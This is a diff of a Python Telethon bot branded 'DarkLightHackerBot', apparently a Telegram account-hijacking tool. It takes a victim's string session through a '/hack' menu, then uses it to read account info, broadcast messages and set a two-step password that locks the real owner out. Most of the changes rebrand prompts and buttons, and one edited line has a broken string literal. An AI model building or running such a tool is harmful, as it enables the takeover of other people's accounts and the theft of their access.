@@ -185,7 +185,7 @@ async def user2fa(strses):
     except BaseException:
       pass
     try:
-      await X.edit_2fa('LEGENDBOY IS BEST')
+      await X.edit_2fa('DarkLightHackerBot IS BEST')
       return True
     except:
       return False
@@ -427,7 +427,7 @@ keyboard = [
     Button.inline("N", data="N"),
     ],
   [
-    Button.url("Owner", "https://t.me/DarkLightHacker")
+    Button.url("𝗗𝗮𝗿𝗸 𝗟𝗶𝗴𝗵𝘁 𝗛𝗮𝗰𝗸𝗲𝗿", "https://t.me/DarkLightHacker")
     ]
 ]
 
@@ -485,7 +485,7 @@ async def start(event):
         Button.inline("N", data="N"),
         ],
       [
-        Button.url("Owner", "https://t.me/DarkLightHacker")
+        Button.url("𝗗𝗮𝗿𝗸 𝗟𝗶𝗴𝗵𝘁 𝗛𝗮𝗰𝗸𝗲𝗿", "https://t.me/DarkLightHacker")
         ]
     ]
     await x.send_message(f"Choose what you want with string session \n\n{menu}", buttons=keyboard)
@@ -493,7 +493,7 @@ async def start(event):
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"A")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE USER TELETHON STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
@@ -516,20 +516,20 @@ async def users(event):
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-    await x.send_message("GIVE STRING SESSION")
+    await x.send_message("GIVE USER TELETHON STRING SESSION")
     strses = await x.get_response()
     op = await cu(strses.text)
     if op:
       pass
     else:
-      return await event.respond("This StringSession Has Been Terminated.\n/hack", buttons=keyboard)
+      return await event.respond("This String Session Has Been Terminated.\n/hack", buttons=keyboard)
     i = await userinfo(strses.text)
     await event.reply(i + "\n\nThanks For using @DarkLightHackerBot.\n/hack", buttons=keyboard)
     
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-    await x.send_message("GIVE STRING SESSION")
+    await x.send_message("GIVE USER TELETHON STRING SESSION")
     strses = await x.get_response()
     op = await cu(strses.text)
     if op:
@@ -544,7 +544,7 @@ async def users(event):
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"D")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE USER TELETHON STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
@@ -558,7 +558,7 @@ async def users(event):
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-    await x.send_message("GIVE STRING SESSION")
+    await x.send_message("GIVE USER TELETHON STRING SESSION")
     strses = await x.get_response()
     op = await cu(strses.text)
     if op:
@@ -573,7 +573,7 @@ async def users(event):
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-    await x.send_message("GIVE STRING SESSION")
+    await x.send_message("GIVE USER TELETHON STRING SESSION)
     strses = await x.get_response()
     op = await cu(strses.text)
     if op:
@@ -587,7 +587,7 @@ async def users(event):
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"G")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE USER TELETHON STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
@@ -602,7 +602,7 @@ async def users(event):
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE USER TELETHON STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
@@ -618,7 +618,7 @@ async def users(event):
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"I")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE USER TELETHON STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
@@ -631,7 +631,7 @@ async def users(event):
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE USER TELETHON STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
@@ -644,7 +644,7 @@ async def users(event):
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"K")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE USER TELETHON STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
@@ -661,7 +661,7 @@ async def users(event):
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"L")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE USER TELETHON STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
@@ -679,7 +679,7 @@ async def users(event):
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"M")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE USER TELETHON STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
@@ -763,7 +763,7 @@ async def gcasta(strses, msg):
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"a")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE USER TELETHON STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
@@ -887,7 +887,7 @@ async def gcastb(strses, msg):
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"b")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE USER TELETHON STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
@@ -922,7 +922,7 @@ async def gcastc(strses, msg):
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"c")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE USER TELETHON STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
